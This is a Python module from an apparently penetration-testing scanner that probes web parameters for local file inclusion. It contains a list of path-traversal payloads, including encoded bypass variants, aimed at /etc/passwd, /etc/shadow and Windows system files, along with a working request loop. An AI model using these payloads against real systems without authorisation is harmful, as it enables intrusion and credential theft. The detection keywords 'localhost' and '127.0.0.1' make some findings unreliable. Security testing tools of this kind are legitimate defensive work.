"""
lfi_scanner.py — VulnProbe Local File Inclusion Detection Module

Black-box LFI scanner that injects path-traversal payloads into each
supplied parameter and checks for known file-content signatures in the
response body.

Dependencies: requests
"""

import requests


# ---------------------------------------------------------------------------
# Payloads & detection keywords
# ---------------------------------------------------------------------------

LFI_PAYLOADS = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252f..%252fetc%252fpasswd",
    "/etc/passwd",
    "/etc/hosts",
    "/etc/shadow",
    "../../../windows/win.ini",
    "../../../../windows/win.ini",
    r"C:\windows\win.ini",
    "C:/windows/win.ini",
    "../../../../windows/system32/drivers/etc/hosts",
]

DETECTION_KEYWORDS = [
    "root:x:",      # Linux /etc/passwd
    "daemon:",       # Linux /etc/passwd
    "[fonts]",       # Windows win.ini
    "[extensions]",  # Windows win.ini
    "localhost",     # /etc/hosts
    "127.0.0.1",     # /etc/hosts
]


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def scan_lfi(url, params, cookies=None):
    """Run LFI scan against *url*.

    Parameters
    ----------
    url : str
        Target URL.
    params : dict
        Parameter names mapped to their original/default values.
    cookies : dict, optional
        Cookies to attach to every request (e.g. session tokens).

    Returns
    -------
    list[dict]
        Each dict has keys: vuln_type, parameter, payload, evidence, severity.
    """
    findings = []

    for param in params:
        for payload in LFI_PAYLOADS:
            injected_params = dict(params)
            injected_params[param] = payload

            try:
                response = requests.get(
                    url,
                    params=injected_params,
                    cookies=cookies,
                    timeout=10,
                )
            except requests.RequestException:
                continue

            body = response.text

            for keyword in DETECTION_KEYWORDS:
                if keyword in body:
                    findings.append({
                        "vuln_type": "LFI",
                        "parameter": param,
                        "payload": payload,
                        "evidence": body[:200],
                        "severity": "High",
                    })
                    break
            else:
                continue
            break  # finding detected — skip remaining payloads for this param

    return findings


# ---------------------------------------------------------------------------
# CLI entry point
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    test_url = input("Target URL: ")
    test_params = input("Parameters (comma-separated): ").split(",")
    test_params = {p.strip(): "test" for p in test_params}
    cookies_input = input("Session cookie (key=value or leave blank): ").strip()
    cookies = dict([cookies_input.split("=", 1)]) if cookies_input else None
    findings = scan_lfi(test_url, test_params, cookies)
    if findings:
        for f in findings:
            print(f)
    else:
        print("No LFI vulnerabilities detected.")
